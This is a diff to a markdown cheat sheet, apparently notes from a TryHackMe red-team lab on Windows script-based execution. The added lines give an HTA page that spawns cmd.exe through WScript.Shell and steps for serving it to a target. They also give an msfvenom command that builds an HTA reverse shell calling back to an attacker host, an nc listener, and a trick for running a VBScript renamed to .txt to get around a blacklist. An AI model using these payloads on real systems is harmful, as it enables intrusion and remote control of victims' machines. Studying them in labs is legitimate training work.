@@ -25,8 +25,31 @@ It uses VBScript
   shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
   ```
 - Execute it with wscript or cscript in cmd: `wscript c:\Users\thm\Desktop\calc.vbs` or `cscript.exe c:\Users\thm\Desktop\calc.vbs`
+- In case of blacklist, possible to rename in txt and still run it: `wscript /e:VBScript c:\Users\thm\Desktop\payload.txt` 
 
-- In case of blacklist, possible to rename in txt and still run it: `c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt` 
+## HTML Application (HTA)
+
+### Using and `ActiveXObject to execute cmd.exe
+
+```
+<html>
+<body>
+<script>
+        var c= 'cmd.exe'
+        new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+```
+
+- serve the payload `python3 -m http.server 8000`
+- Visit the page from the target machine `http://IP-ATTACK-MACHINE:8000/payload.hta` and run it
+
+### Reverse shell
+
+- Create a reverse shell with msfvenom `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP-ATTACK-MACHINE LPORT=443 -f hta-psh -o thm.hta`
+- Launch a listener: `nc -lvp 443`
+- Possible to generate and serve HTA with Metasploit framework 
 
 ## Resources
 
